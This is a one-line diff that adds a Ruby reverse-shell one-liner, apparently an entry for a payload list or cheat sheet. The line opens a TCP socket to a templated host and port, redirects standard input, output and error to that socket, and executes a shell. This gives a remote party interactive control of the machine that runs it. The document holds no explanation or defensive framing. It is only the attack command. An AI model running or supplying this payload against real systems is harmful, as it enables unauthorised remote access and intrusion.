@@ -1,0 +1,1 @@
+ruby -rsocket -e 's = TCPSocket.new("*\host*",*\port*); STDIN.reopen(s); STDOUT.reopen(s); STDERR.reopen(s); exec "*\shell*"'
